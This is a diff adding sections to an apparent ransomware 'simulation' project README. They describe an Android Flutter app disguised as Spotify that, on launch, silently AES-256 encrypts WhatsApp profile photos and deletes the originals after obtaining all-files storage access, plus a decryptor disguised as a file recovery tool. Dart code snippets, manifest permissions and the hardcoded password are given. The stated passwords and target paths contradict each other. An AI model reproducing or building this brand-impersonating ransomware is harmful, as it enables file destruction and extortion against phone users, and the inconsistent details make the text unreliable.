@@ -260,6 +260,207 @@ The final executable:
 | Original File Removal | Deletes `.encrypted` file after successful decryption |
 | Error Handling | Catches and prints error if decryption fails |
 | Final Packaging | Converted to `.exe` using PyInstaller |  
+
+# Spotify Module Configuration (Android - Dart Version)
+
+This module simulates a ransomware attack on Android by disguising a malicious Flutter application as the popular Spotify app. The primary purpose of this module is to educate and demonstrate how attackers can abuse trusted brand identities and sensitive permissions to silently encrypt user files—in this case, WhatsApp profile photos.
+
+## Summary
+
+| Component | Description |
+|-----------|-------------|
+| App Name | Spotify (disguised ransomware) |
+| Language/SDK | Dart (Flutter Framework) |
+| Package Type | Android APK |
+| Target Directory | /storage/emulated/0/WhatsApp/Media/WhatsApp Profile Photos/ |
+| Encryption Algorithm | AES-256 CBC |
+| Password | FaizShiv200@123 (converted to key via SHA-256) |
+| Permissions | MANAGE_EXTERNAL_STORAGE |
+| Trigger | Automatic encryption on app launch |
+| Output File | Original files renamed with .enc extension |
+
+## Core Logic Overview
+
+The fake Spotify APK is a full Dart (Flutter) application that performs silent encryption of all image files inside the WhatsApp profile photo directory when launched.
+
+### Key Generation (Dart)
+
+```dart
+final password = "Shivam200@123";
+final key = sha256.convert(utf8.encode(password)).bytes;
+final keySpec = encrypt.Key(Uint8List.fromList(key));
+```
+
+### IV Generation
+
+```dart
+final ivBytes = encrypt.IV.fromSecureRandom(16);
+```
+
+### Encryption Flow
+
+```dart
+final encrypter = encrypt.Encrypter(encrypt.AES(keySpec, mode: encrypt.AESMode.cbc));
+final encrypted = encrypter.encryptBytes(file.readAsBytesSync(), iv: ivBytes);
+```
+
+### Save Encrypted Files
+
+```dart
+final encryptedFile = File('${file.path}.enc');
+encryptedFile.writeAsBytesSync(ivBytes.bytes + encrypted.bytes);
+file.deleteSync(); // Optional: delete original file
+```
+
+## Target Directory
+
+This module recursively searches for `.jpg`, `.jpeg`, `.png` files in the following WhatsApp directory:
+
+```
+/storage/emulated/0/WhatsApp/Media/WhatsApp Profile Photos/
+```
+
+As soon as the fake app (Spotify) is launched, the encryption begins without user interaction.
+
+## Required Android Permissions
+
+```xml
+<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+```
+
+To enable full storage access, the app uses:
+
+```dart
+await AndroidIntent(
+  action: 'android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION',
+).launch();
+```
+
+This allows the ransomware to access, encrypt, and delete any files in the internal storage freely.
+
+## Educational Focus
+
+This module helps in understanding:
+
+- The risk of sideloading APKs from unknown sources.
+- How legitimate-looking apps (like Spotify) can mask malicious intent.
+- How ransomware targets sensitive folders like WhatsApp.
+- How AES-256 CBC works with key + IV combo.
+- The impact of granting full storage permission to unknown apps.
+# Decryptor Module Configuration (Android - Dart/Flutter Based)
+
+This module is the counterpart to the fake Spotify Encryptor APK created using Flutter (Dart). It simulates a ransomware recovery utility that decrypts AES-256 CBC encrypted files, specifically WhatsApp profile photos, on Android devices. It uses the same key ("Shivam200@123") used during encryption and requires access to external storage.
+
+The app is disguised as a File Recovery Tool, but its real functionality is to manually or automatically decrypt files encrypted by the ransomware module.
+
+## Summary
+
+| Component | Description |
+|-----------|-------------|
+| App Name | File Recovery Tool (Disguised Decryptor) |
+| Platform | Android (Flutter/Dart-based) |
+| Target File(s) | /storage/emulated/0/Android/media/com.whatsapp/Profile Photos/*.enc |
+| Decryption Algo | AES-256 in CBC mode |
+| Key | "FaizShiv200@123" (hardcoded and hashed with SHA-256) |
+| Trigger | Decryption on app launch (manual or automatic) |
+| Output File | Restored image (original file name without .enc) |
+| Permissions | MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE |
+
+## Core Logic Overview (in Dart)
+
+### Password Derivation
+
+```dart
+import 'dart:convert';
+import 'package:crypto/crypto.dart';
+import 'package:encrypt/encrypt.dart';
+
+final password = 'Shivam200@123';
+final keyBytes = sha256.convert(utf8.encode(password)).bytes;
+final key = Key(Uint8List.fromList(keyBytes));
+```
+
+### Read Encrypted File and Extract IV
+
+```dart
+final fileBytes = await encryptedFile.readAsBytes();
+final iv = IV(fileBytes.sublist(0, 16));
+final encryptedData = Encrypted(fileBytes.sublist(16));
+```
+
+### Decrypt Content
+
+```dart
+final encrypter = Encrypter(AES(key, mode: AESMode.cbc));
+final decryptedBytes = encrypter.decryptBytes(encryptedData, iv: iv);
+```
+
+### Restore Original File
+
+```dart
+final outputFilePath = encryptedFile.path.replaceAll('.enc', '');
+final outputFile = File(outputFilePath);
+await outputFile.writeAsBytes(decryptedBytes);
+```
+
+## Target File(s)
+
+The decryptor scans:
+
+```
+/storage/emulated/0/Android/media/com.whatsapp/Profile Photos/*.enc
+```
+
+Each file with a `.enc` extension is decrypted and restored to:
+
+```
+/storage/emulated/0/Android/media/com.whatsapp/Profile Photos/<original_filename>.jpg
+```
+
+## Required Android Permissions
+
+Add the following permissions in `AndroidManifest.xml`:
+
+```xml
+<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+```
+
+In Android 11+ you must also request permissions dynamically using `Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION`.
+
+## Educational Focus
+
+This module demonstrates:
+
+- Secure AES-256 CBC decryption in a real-world mobile simulation.
+- The importance of key and IV integrity for successful decryption.
+- How ransomware can be reversed if the key is preserved.
+- The concept of file scanning and targeted decryption within app directories.
+- Simulates real-world decryption tools disguised as helpful utilities.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # Deployment (Final Phase) – Simple & Detailed
 
 ## Objective:
@@ -330,6 +531,64 @@ Each target file is encrypted:
 - Original file is deleted.
 - Output files are saved with `.encrypted` extension.
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
 ### Deployment Steps:
 Compiled into EXE using:
 ```bash
